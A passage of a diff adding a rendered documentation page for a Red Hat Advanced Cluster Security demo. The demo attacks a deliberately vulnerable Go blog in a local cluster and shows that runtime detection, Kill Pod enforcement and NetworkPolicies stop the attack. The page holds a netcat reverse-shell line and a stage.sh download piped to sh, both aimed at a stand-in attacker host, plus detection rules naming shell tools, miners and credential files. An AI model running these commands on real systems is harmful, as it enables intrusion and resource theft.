+baseline is <strong>empty and locked</strong> — nothing legitimate ever calls it.</p>
+<h3 id="act-4-persistence-and-profit-4-min">Act 4 — "Persistence and profit" (4 min)</h3>
+<p>Start the listener in <strong>Terminal B</strong> first:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>scripts/attacker.sh<span class="w"> </span>c2
+</code></pre></div>
+<p>Then in Terminal A:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>scripts/demo.sh<span class="w"> </span>act4
+</code></pre></div>
+<ol>
+<li><strong>Reverse shell.</strong> The blog connects back to <code>attacker.example.local:4444</code> — the presenter's laptop. In Terminal B, type live:
+   <code>id</code>, <code>hostname</code>, <code>ps</code>. The audience sees an interactive shell inside your "unhackable" pod.</li>
+<li><strong>Crypto miner.</strong> The attacker downloads <code>http://attacker.example.local:8080/stage.sh</code> and pipes it into
+   <code>sh</code>. Root FS is read-only, <code>/dev/shm</code> is <code>noexec</code> — but <code>/tmp</code> is a writable emptyDir. A binary named
+   <code>xmrig</code> lands in <code>/tmp/.cache</code>, gets <code>chmod +x</code>, starts and connects to <code>attacker.example.local:3333</code>.
+   (It's a harmless simulator: it burns one core and mines nothing.) <code>scripts/attacker.sh logs</code> shows the
+   attacker's side: the download and the incoming miner shares.</li>
+</ol>
+<p>Show the stack of violations: <strong>Reverse shell tool executed</strong>, <strong>Crypto miner</strong>, <strong>Container drift: file
+dropped or made executable</strong> (File Activity Monitoring saw the <code>CREATE</code> in <code>/tmp</code> and the <code>chmod</code>), plus new
+<strong>network flows</strong> from the blog to the external entity <strong>attacker.example.local</strong> on 8080, 4444 and 3333.</p>
+<blockquote>
+<p>💬 <em>"Everything the attacker did was seen within seconds, and every alert is mapped to MITRE
+ATT&amp;CK. But seeing isn't stopping. The miner is still running and the shell is still open."</em></p>
+</blockquote>
+<h3 id="act-5-respond-shrink-the-blast-radius-then-close-the-door-4-min">Act 5 — "Respond: shrink the blast radius, then close the door" (4 min)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>scripts/demo.sh<span class="w"> </span>act5
+</code></pre></div>
+<p>Two steps, in the order real incident response works — <strong>stop the bleeding, then close the door</strong>:</p>
+<ol>
+<li><strong>Kill (immediate containment).</strong> The script switches the TDR policies to <strong>Kill Pod</strong> (they're
+   <code>SecurityPolicy</code> custom resources — policy as code). The attacker comes back with <code>id</code>… <strong>the pod is
+   killed</strong> (OpenShift records a <em>StackRox enforcement</em> event) and Kubernetes replaces it from the
+   original image. Terminal B — the reverse shell — <strong>goes dead</strong>; the miner and <code>/tmp/.cache</code> are gone.
+   Every new attempt costs the attacker the pod: the blast radius is now one command, and we've
+   <strong>bought time</strong>.</li>
+<li><strong>Network enforcement (with time bought).</strong> A NetworkPolicy: the blog may receive traffic from the
+   router and reach DNS and the internet on 80/443; payments-api accepts nothing. The retry uses
+an in-process Go rule — the <strong>app itself</strong> makes the outbound call, no new process for RHACS to kill — and
+   it times out: <code>attacker.example.local:8080</code> is unreachable. The NetworkPolicy stops what enforcement can't see.</li>
+</ol>
+<blockquote>
+<p>💬 <em>"The kill stopped this attacker. The NetworkPolicy stops the next one before the first packet
+leaves."</em></p>
+</blockquote>
+<p>Point out the violation's <strong>Enforcement</strong> tab: <em>"Kill Pod has been applied N times"</em>.</p>
+<blockquote>
+<p>⚠️ With enforcement on, <strong>anything</strong> outside the baseline kills the pod — including <code>head</code>, <code>grep</code>
+or an <code>oc exec</code> by you. That is the point. <code>scripts/demo.sh reset</code> turns it off again.</p>
+</blockquote>
+<h3 id="act-6-fix-forward-3-min">Act 6 — "Fix forward" (3 min)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>scripts/demo.sh<span class="w"> </span>act6
+</code></pre></div>
+<p>Show the diff between <code>app/blog/linkcheck_v1.go</code> and <code>linkcheck_v2.go</code>: parse the URL, allow only
+http/https, use Go's HTTP client — <strong>no rule engine, nothing evaluated</strong>. v2 rolls out, still <strong>0 CVEs</strong>, and the exploit
+returns <em>rejected</em>.</p>
+<blockquote>
+<p>💬 <em>"Close with the three layers: shift-left kept the image clean — zero CVEs. Runtime detection
+caught the attack the scanner could never see. Enforcement and network policy stopped it. You need
+all three."</em></p>
+</blockquote>
+<hr />
+<h2 id="reset-between-runs">Reset between runs</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>scripts/demo.sh<span class="w"> </span>reset<span class="w">     </span><span class="c1"># enforcement off, NetworkPolicies removed, back to v1, fresh pods, violations resolved</span>
+</code></pre></div>
+<p>Baselines stay locked across resets (they're per deployment, not per pod).
+Full rebuild: <code>scripts/02-demo-setup.sh</code>. Everything from scratch:
+<code>scripts/01-rhacs-install.sh --uninstall &amp;&amp; crc delete</code>.</p>
+<p>Ad-hoc commands through the vulnerability: <code>scripts/demo.sh pwn 'ls -la /tmp'</code>.</p>
+<hr />
+<h2 id="the-attacker-lives-outside-the-cluster">The attacker lives outside the cluster</h2>
+<p>Nothing attacker-side runs in OpenShift. The attacker's machine is <strong>the presenter's laptop</strong>, reached by
+<strong>name</strong> — exactly like a real attacker-controlled domain on the internet:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a> blog pod ──► attacker.example.local:8080   payload server  (stage.sh, xmrig)
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>          ──► attacker.example.local:3333   mining pool
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>          ──► attacker.example.local:4444   C2 — reverse shell listener (scripts/attacker.sh c2)
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Piece</th>
+<th>How</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>The address</strong></td>
+<td><code>1.2.3.4</code> — a real, routable public IPv4. RHACS treats private ranges (<code>192.168.x</code>, <code>10.x</code>) as internal, so the attacker needs a public address. <code>attacker.sh up</code> adds it to the laptop's <code>crc</code> bridge (runtime only) — "spoofed" locally: the CRC VM's default gateway is the laptop, so pod traffic to it lands there and <strong>never leaves the machine</strong>. Override with <code>ATTACKER_IP=…</code>.</td>
+</tr>
+<tr>
+<td><strong>The name</strong></td>
+<td><code>attacker.sh up</code> runs the attacker's own nameserver (podman, <code>:5300/udp</code>) answering <code>*.example.local</code> with <code>1.2.3.4</code>, and adds one forwarding rule to OpenShift DNS: zone <code>example.local</code> → that nameserver.</td>
+</tr>
+<tr>
+<td><strong>The services</strong></td>
+<td>podman containers on the laptop, bound <strong>only</strong> to <code>1.2.3.4</code>.</td>
+</tr>
+<tr>
+<td><strong>The firewall</strong></td>
+<td>The laptop keeps dropping all inbound traffic. Only the CRC bridge (zone <code>libvirt</code>) gets <em>runtime</em> rules for 5300/udp, 8080/3333/4444/tcp from <code>192.168.130.0/24</code>. <code>attacker.sh down</code> (or a reboot) removes them.</td>
+</tr>
+<tr>
+<td><strong>In RHACS</strong></td>
+<td><code>1.2.3.4/32</code> is registered as a named external network entity, so the Network Graph shows <strong>attacker.example.local</strong> outside the cluster, not an IP. Ordinary internet traffic stays one <em>External Entities</em> node.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="roxctl-and-the-rox-helpers">roxctl and the <code>rox-*</code> helpers</h2>
+<p><code>01-rhacs-install.sh</code> stores an API token and the Central endpoint in <code>~/.config/rhacs/crc.env</code> (mode 600)
+and installs <code>~/.bashrc.d/rhacs.sh</code>, so <strong>every new shell</strong> has <code>ROX_ENDPOINT</code> and <code>ROX_API_TOKEN</code> and plain
+<code>roxctl</code> just works (<code>roxctl central whoami</code>).</p>
+<p>The same file loads readable helpers. They <strong>do not replace <code>roxctl</code></strong> — they call it with <code>-o json</code> and print
+tables that fit the screen:</p>
+<table>
+<thead>
+<tr>
+<th>Helper</th>
+<th>Shows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rox-ui</code> / <code>rox-password</code></td>
+<td>Central URL, user, password (password also copied to the clipboard)</td>
+</tr>
+<tr>
+<td><code>rox-scan IMAGE [SEV]</code></td>
+<td>CVE summary + table</td>
+</tr>
+<tr>
+<td><code>rox-check IMAGE</code> / <code>rox-deploy FILE</code></td>
+<td>build-time / deploy-time policy violations</td>
+</tr>
+<tr>
+<td><code>rox-violations [NS]</code></td>
+<td>active violations, newest first, with enforcement count</td>
+</tr>
+<tr>
+<td><code>rox-processes NS/DEPLOY</code></td>
+<td>every process RHACS saw in a deployment</td>
+</tr>
+<tr>
+<td><code>rox-baseline NS/DEPLOY</code></td>
+<td>the locked process baseline</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="rhacs-50-features-used">RHACS 5.0 features used</h2>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Where</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Scanner V4 only</strong> (the legacy scanner is gone in 5.0)</td>
+<td><code>rhacs/install/central.yaml</code></td>
+</tr>
+<tr>
+<td><strong>Cluster Registration Secret</strong> (<code>roxctl central crs generate</code>)</td>
+<td><code>01-rhacs-install.sh</code></td>
+</tr>
+<tr>
+<td><strong>File Activity Monitoring</strong> (<code>File Path</code> + <code>File Operation</code>: <code>CREATE</code>, <code>RENAME</code>, <code>PERMISSION_CHANGE</code>, …) — watches only the paths policies name; keep them narrow</td>
+<td><code>tdr-file-drift</code></td>
+</tr>
+<tr>
+<td><strong>Process baseline auto-lock</strong> (<code>processBaselines.autoLock</code>)</td>
+<td><code>secured-cluster.yaml</code> (the demo also locks explicitly via API)</td>
+</tr>
+<tr>
+<td><strong>Process indicator filtering</strong> (<code>processIndicators.excludeOpenshiftNs</code>)</td>
+<td><code>secured-cluster.yaml</code></td>
+</tr>
+<tr>
+<td><strong>Cluster labels</strong> (<code>clusterLabels</code>)</td>
+<td><code>secured-cluster.yaml</code></td>
+</tr>
+<tr>
+<td><strong>Policy as code</strong> (<code>SecurityPolicy</code> CRs, status conditions <code>AcceptedByCentral</code>)</td>
+<td><code>rhacs/policies/</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="whats-in-the-box">What's in the box</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>threat-detection-response/
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>├── Makefile                       make install · up · reset · status · act1…act6 · down
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>├── README.md                      this file — the story and how to deliver it
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>├── docs/WALKTHROUGH.md            the full story, act by act, with screenshots of a real run
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>├── docs/TALK.md                   the 40-minute talk: run of show, speaking guide, Q&amp;A, checklist
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>├── docs/SCRIPT.md                 the talk word for word, with stage directions
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>├── docs/slides/                   intro slide images (release.png)
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>├── app/
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>│   ├── blog/                      Go, one dependency (yaegi), Alpine runtime — 0 CVEs
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>│   │   ├── main.go                blog + payments mode
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>│   │   ├── linkcheck_v1.go        the bug (evals untrusted Go via yaegi)       build: VARIANT=v1
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>│   │   ├── linkcheck_v2.go        the fix (url.Parse + net/http)       build: VARIANT=v2
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>│   │   ├── web/                   templates
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>│   │   └── Containerfile
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>│   └── attacker-kit/              runs on the LAPTOP: nameserver, payload server, fake pool, harmless xmrig
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>├── deploy/
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>│   ├── app/                       namespaces, blog (+ honeytokens), payments-api
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>│   └── response/                  containment NetworkPolicies (Act 5)
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>├── rhacs/
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>│   ├── install/                   operator, Central, SecuredCluster
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>│   └── policies/                  TDR runtime policies as SecurityPolicy CRs
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>└── scripts/
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>    ├── 00-crc-up.sh  01-rhacs-install.sh  02-demo-setup.sh
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>    ├── attacker.sh                the attacker's laptop side: up, c2, logs, status, down
+<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>    ├── demo.sh                    acts, pwn, status, reset
+<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>    ├── status.sh                  make status: read-only snapshot of every layer
+<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>    └── lib/                       common.sh, rhacs-aliases.sh (rox-*), rhacs-baselines.sh (from the rhacs repo)
+</code></pre></div>
+<h3 id="the-policies">The policies</h3>
+<table>
+<thead>
+<tr>
+<th>Policy</th>
+<th>Detects</th>
+<th>Act 5</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>TDR – Unauthorized process in the Unhackable Blog</td>
+<td>any process outside the locked baseline</td>
+<td>kill pod</td>
+</tr>
+<tr>
+<td>TDR – Reverse shell tool executed</td>
+<td><code>nc</code>, <code>ncat</code>, <code>netcat</code>, <code>socat</code></td>
+<td>kill pod</td>
+</tr>
+<tr>
+<td>TDR – Crypto miner in the Unhackable Blog</td>
+<td><code>xmrig</code>, <code>minerd</code>, <code>cpuminer</code>, …</td>
+<td>kill pod</td>
+</tr>
+<tr>
+<td>TDR – Container drift: file dropped or made executable</td>
+<td>File Activity Monitoring: <code>CREATE</code>/<code>RENAME</code> under <code>/tmp/**</code>, <code>PERMISSION_CHANGE</code> under <code>/tmp/**</code> and <code>/var/cache/blog/**</code> (the only writable volumes)</td>
+<td>kill pod</td>
+</tr>
+<tr>
+<td>TDR – Honeytoken touched: decoy AWS credentials</td>
+<td>any process whose arguments name <code>.aws/credentials</code> or a <code>.env</code> file</td>
+<td>alert</td>
+</tr>
+<tr>
+<td>TDR – Kubernetes API reconnaissance from the blog</td>
+<td>any process whose arguments name the in-cluster API, <code>kubernetes.default</code></td>
+<td>alert</td>
+</tr>
+<tr>
+<td>TDR – Unexpected network flow to payments-api</td>
+<td>network baseline anomaly, scoped to <code>payments</code> (empty, locked baseline)</td>
+<td>alert</td>
+</tr>
+</tbody>
+</table>
+<p>All TDR policies are scoped to cluster <code>production</code> (namespace <code>unhackable</code>, or <code>payments</code> for lateral
+movement) and mapped to MITRE ATT&amp;CK. RHACS's built-ins <em>Netcat Execution Detected</em>, <em>Cryptocurrency
+Mining Process Execution</em> and <em>Unauthorized Process Execution</em> fire too. The built-in <em>Unauthorized
+Network Flow</em> stays disabled: on a single-node cluster every DNS lookup appears as a new UDP flow.</p>
+<p><strong>RHACS 5.0 lessons baked into these policies</strong> (found while testing):</p>
+<ul>
+<li>File Activity Monitoring watches <strong>exactly</strong> the paths your policies name. A <code>/**</code> makes it inventory
+  the whole node — and nothing gets reported. Name the writable volumes only.</li>
+<li>FAM reports <strong>modifications</strong> (create, rename, permission/ownership change, write-intent open).
+  Reading a read-only file isn't one — that's why the honeytoken uses process arguments.</li>
+<li>A runtime policy can't mix process and file criteria in different sections.</li>
+<li>A network baseline anomaly fires the <strong>first</strong> time a flow between two deployments appears;
+  resolving the alert doesn't re-arm it. <code>reset</code> recreates payments-api so every run is fresh.</li>
+</ul>
+<hr />
+<h2 id="questions-you-will-get">Questions you will get</h2>
+<p><strong>"Why not just remove the shell from the image?"</strong>
+You should — v2 doesn't need it. But the point stands: the image <em>passed</em> every check with the shell
+in it, and plenty of real apps legitimately shell out. Distroless shrinks the toolbox; it doesn't fix
+your code. And attackers bring their own tools (Act 4 downloads one).</p>
+<p><strong>"Couldn't a WAF catch the malicious rule?"</strong>
+Maybe this payload. Not the next encoding. Runtime detection doesn't care how the attacker got in — it
+sees what they <em>do</em>.</p>
+<p><strong>"Won't kill-pod enforcement take my app down?"</strong>
+It kills one pod; the Deployment replaces it in seconds. It only fires on behaviour outside a locked
+baseline, so it's for workloads whose behaviour you know. Start in alert mode (Acts 2–4), enforce
+once the baseline is stable (Act 5).</p>
+<p><strong>"Doesn't the attacker get a connection before the kill?"</strong>
+Yes — briefly. Kill Pod is a <em>response</em>, not prevention: RHACS sees the <code>exec</code>, then kills the pod.
+Measured on this demo with enforcement on and <strong>no</strong> NetworkPolicy: the attacker sends
+<code>nc attacker.example.local 4444 -e /bin/sh</code> at t=0; the TCP connection reaches the attacker; at
+<strong>t=0.69 s</strong> RHACS kills the pod and the connection drops; at <strong>t=2.9 s</strong> a clean pod is Ready. Useless to
+a human typing commands — and the NetworkPolicy (Act 5, step 2) removes even that window.</p>
+<p><strong>"What can trigger the kill — process, file or network?"</strong>
+Tested on RHACS 5.0:</p>
+<table>
+<thead>
+<tr>
+<th>Trigger</th>
+<th>Kill Pod</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Process (binary outside the baseline, <code>nc</code>, <code>xmrig</code>, …)</td>
+<td>✓ pod killed</td>
+</tr>
+<tr>
+<td>File activity (file created in <code>/tmp</code> by an <em>allowed</em> binary)</td>
+<td>✓ pod killed — the event names the file policy</td>
+</tr>
+<tr>
+<td>Network-flow anomaly (blog → payments-api)</td>
+<td>✗ <strong>alert only.</strong> Central <em>accepts</em> Kill Pod on the policy without error, but no pod is killed</td>
+</tr>
+</tbody>
+</table>
+<p>So kills come from what runs and what gets written; network anomalies are answered with a
+NetworkPolicy — exactly Act 5's two steps. Don't assume a network-flow policy enforces just because
+the UI saved it.</p>
+<p><strong>"How long does baselining take?"</strong>
+RHACS learns automatically during an observation period. This demo locks the baseline right after
+generating normal traffic, through the API (<code>scripts/lib/rhacs-baselines.sh</code>).</p>
+<p><strong>"Is the miner real?"</strong>
+No. <code>app/attacker-kit/xmrig</code> is a simulator named <code>xmrig</code> so the policy matches it. It burns one core
+for at most 10 minutes and talks only to the fake pool on the presenter's laptop.</p>
+<hr />
+<h2 id="troubleshooting">Troubleshooting</h2>
+<table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>crc setup</code> complains about the libvirt group</td>
+<td>the script re-executes itself with <code>sg libvirt</code>; otherwise log out and back in once</td>
+</tr>
+<tr>
+<td>Blog can't reach <code>attacker.example.local</code></td>
+<td><code>scripts/attacker.sh status</code> — address on the bridge + firewall must show <code>open-for-crc</code>; re-run <code>attacker.sh up</code> after <code>crc stop/start</code></td>
+</tr>
+<tr>
+<td><code>*.apps-crc.testing</code> times out while NordVPN is connected</td>
+<td>its firewall blocks the CRC bridge: <code>nordvpn whitelist add subnet 192.168.130.0/24</code> (once)</td>
+</tr>
+<tr>
+<td><code>*.apps-crc.testing</code> doesn't resolve</td>
+<td><code>crc setup</code> installs a NetworkManager dispatcher for systemd-resolved; restart NetworkManager or re-run <code>crc setup</code></td>
+</tr>
+<tr>
+<td>Policy shows <code>accepted: false</code></td>
+<td><code>oc get securitypolicy -n stackrox &lt;name&gt; -o yaml</code> → <code>status.message</code></td>
+</tr>
+<tr>
+<td>No <em>Unauthorized process</em> alert</td>
+<td>baseline not locked: <code>source scripts/lib/rhacs-baselines.sh; load…; rhacs-pb-lock unhackable/blog</code> (or re-run <code>02-demo-setup.sh</code>)</td>
+</tr>
+<tr>
+<td>Act 5 pod not killed</td>
+<td>enforcement is pushed by Central to Sensor; wait ~15 s after <code>act5</code> starts, check <code>make status</code></td>
+</tr>
+<tr>
+<td><em>Unexpected network flow to payments-api</em> doesn't fire on a re-run</td>
+<td>run <code>scripts/demo.sh reset</code> first — it recreates payments-api so the flow is new again</td>
+</tr>
+<tr>
+<td>Legit link checks raise <em>Unauthorized process</em></td>
+<td>the baseline should be exactly <code>/usr/local/bin/blog</code>; run <code>scripts/demo.sh reset</code> (or re-run <code>02-demo-setup.sh</code>)</td>
+</tr>
+<tr>
+<td>Image shows CVEs</td>
+<td>rebuild: <code>scripts/02-demo-setup.sh</code> pulls the latest Alpine/Go and upgrades every package</td>
+</tr>
+<tr>
+<td>Cluster slow on battery</td>
+<td>plug in: the laptop's low-power mode parks CPU cores</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.a5f9d56c.min.js"></script>
+      
+    
+  </body>
+</html>
